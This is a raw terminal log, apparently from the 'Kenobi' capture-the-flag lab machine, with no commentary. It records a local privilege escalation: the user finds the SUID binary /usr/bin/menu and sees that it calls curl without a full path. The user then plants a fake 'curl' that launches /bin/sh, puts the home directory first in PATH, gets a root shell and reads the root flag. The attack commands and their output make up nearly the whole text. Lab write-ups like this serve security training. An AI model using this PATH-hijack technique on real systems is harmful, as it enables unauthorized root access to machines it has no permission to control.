
```sh
kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo

kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

```sh
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :^C

kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
menu.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```

```sh
kenobi@kenobi:~$ cp /bin/sh curl
kenobi@kenobi:~$ chmod 777 curl
kenobi@kenobi:~$ $PATH
-bash: /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
kenobi@kenobi:~$ $PATH
-bash: /home/kenobi:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
curl: 0: Can't open localhost
kenobi@kenobi:~$ ls -la
total 192
drwxr-xr-x 5 kenobi kenobi   4096 Apr 22 02:06 .
drwxr-xr-x 3 root   root     4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root        9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi    220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi   3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi   4096 Sep  4  2019 .cache
-rwxrwxrwx 1 kenobi kenobi 154072 Apr 22 02:07 curl
-rw-r--r-- 1 kenobi kenobi    655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi   4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi   4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi     33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi    642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ export PATH=.:$PATH
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
curl: 0: Can't open localhost
kenobi@kenobi:~$ echo /bin/sh > curl
kenobi@kenobi:~$ ls -la
total 44
drwxr-xr-x 5 kenobi kenobi 4096 Apr 22 02:06 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rwxrwxrwx 1 kenobi kenobi    8 Apr 22 02:12 curl
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# cd /root    
# ls -la
total 32
drwx------  3 root root 4096 Sep  4  2019 .
drwxr-xr-x 23 root root 4096 Sep  4  2019 ..
lrwxrwxrwx  1 root root    9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep  4  2019 .cache
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep  4  2019 root.txt
-rw-------  1 root root 5383 Sep  4  2019 .viminfo
# cat root.txt
177b3cd8562289f37382721c28381f02
# exit
kenobi@kenobi:~$ ls -la
total 44
drwxr-xr-x 5 kenobi kenobi 4096 Apr 22 02:06 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rwxrwxrwx 1 kenobi kenobi    8 Apr 22 02:12 curl
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ rm curl
kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Apr 22 02:42 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cp /bin/bash .
kenobi@kenobi:~$ ls -la
total 1056
drwxr-xr-x 5 kenobi kenobi    4096 Apr 22 02:42 .
drwxr-xr-x 3 root   root      4096 Sep  4  2019 ..
-rwxr-xr-x 1 kenobi kenobi 1037528 Apr 22 02:42 bash
lrwxrwxrwx 1 root   root         9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi     220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi    3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi     655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi    4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi      33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi     642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ mv bash curl
kenobi@kenobi:~$ ls -la
total 1056
drwxr-xr-x 5 kenobi kenobi    4096 Apr 22 02:42 .
drwxr-xr-x 3 root   root      4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root         9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi     220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi    3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .cache
-rwxr-xr-x 1 kenobi kenobi 1037528 Apr 22 02:42 curl
-rw-r--r-- 1 kenobi kenobi     655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi    4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi      33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi     642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
curl: localhost: No such file or directory
kenobi@kenobi:~$ $PATH
-bash: .:/home/kenobi:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
kenobi@kenobi:~$ pwd
/home/kenobi
kenobi@kenobi:~$ export PATH=/home/kenobi:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:~$ $PATH
-bash: /home/kenobi:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
curl: localhost: No such file or directory
kenobi@kenobi:~$ which echo > surl
kenobi@kenobi:~$ which echo > curl
kenobi@kenobi:~$ exit
logout
Connection to 10.10.140.251 closed.

```
